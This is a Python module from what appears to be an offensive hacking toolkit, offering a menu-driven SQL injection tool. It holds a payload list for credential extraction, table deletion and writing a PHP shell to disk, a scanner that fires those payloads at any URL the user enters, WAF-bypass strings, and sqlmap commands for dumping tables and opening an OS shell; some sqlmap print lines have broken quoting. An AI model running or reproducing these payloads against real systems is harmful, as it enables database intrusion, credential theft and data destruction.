#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_sqli():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           SQL INJECTION MODULE                        ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Vulnerability Scanner")
    print("[2] Error-Based Enumeration")
    print("[3] Union-Based Extraction")
    print("[4] Blind SQLi (Time-Based)")
    print("[5] WAF Bypass")
    print("[6] SQLMap Integration")
    choice = input("\n[SQLI] Select: ").strip()
    payloads = [
        "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--", "' AND 1=2--", "' OR 'x'='x", "admin'--",
        "1' AND 1=1--", "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR 1=1 LIMIT 1--", "' UNION SELECT username,password FROM users--",
        "'; DROP TABLE users;--", "' OR 1=1 INTO OUTFILE '/tmp/shell.php'--"
    ]
    if choice == "1":
        url = input("[SQLI] Target URL (with param): ").strip()
        param = input("[SQLI] Parameter (default id): ").strip() or "id"
        print("[SQLI] Scanning " + url + "...")
        print("[SQLI] Testing " + str(len(payloads)) + " payloads...")
        try:
            import urllib.request
            for i, p in enumerate(payloads, 1):
                import urllib.parse
                enc = urllib.parse.quote(p)
                test = url.replace(param + "=", param + "=" + enc)
                req = urllib.request.Request(test, headers={"User-Agent": "Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                text = resp.read().decode().lower()
                if any(err in text for err in ["sql", "mysql", "syntax", "error", "warning"]):
                    print("    [VULNERABLE] " + p[:40])
        except Exception as e:
            print("[SQLI] Error: " + str(e))
        log_action("SQLI", "Scan on " + url)
    elif choice == "2":
        url = input("[SQLI] Target URL: ").strip()
        print("[SQLI] Error-based payloads:")
        print("    ' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--")
        log_action("SQLI", "Error-based on " + url)
    elif choice == "3":
        url = input("[SQLI] Target URL: ").strip()
        cols = int(input("[SQLI] Columns (default 3): ").strip() or "3")
        union = " UNION SELECT " + ",".join(["NULL"] * cols) + "--"
        print("[SQLI] UNION payload: " + union)
        log_action("SQLI", "Union-based on " + url)
    elif choice == "4":
        url = input("[SQLI] Target URL: ").strip()
        print("[SQLI] Time-based: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--")
        log_action("SQLI", "Blind SQLi on " + url)
    elif choice == "5":
        print("[SQLI] WAF Bypass:")
        bypasses = ["SeLeCt * FrOm users", "/*!50000SELECT*/ * FROM users", "'/**/OR/**/1=1",
                    "%27%20%4F%52%20%31%3D%31", "' OR '1' LIKE '1"]
        for b in bypasses:
            print("    " + b)
        log_action("SQLI", "WAF bypass listed")
    elif choice == "6":
        url = input("[SQLI] Target URL: ").strip()
        print("[SQLI] sqlmap -u "" + url + "" --dbs --batch")
        print("[SQLI] sqlmap -u "" + url + "" --tables -D database_name")
        print("[SQLI] sqlmap -u "" + url + "" --dump -T users")
        print("[SQLI] sqlmap -u "" + url + "" --os-shell")
        log_action("SQLI", "SQLMap on " + url)
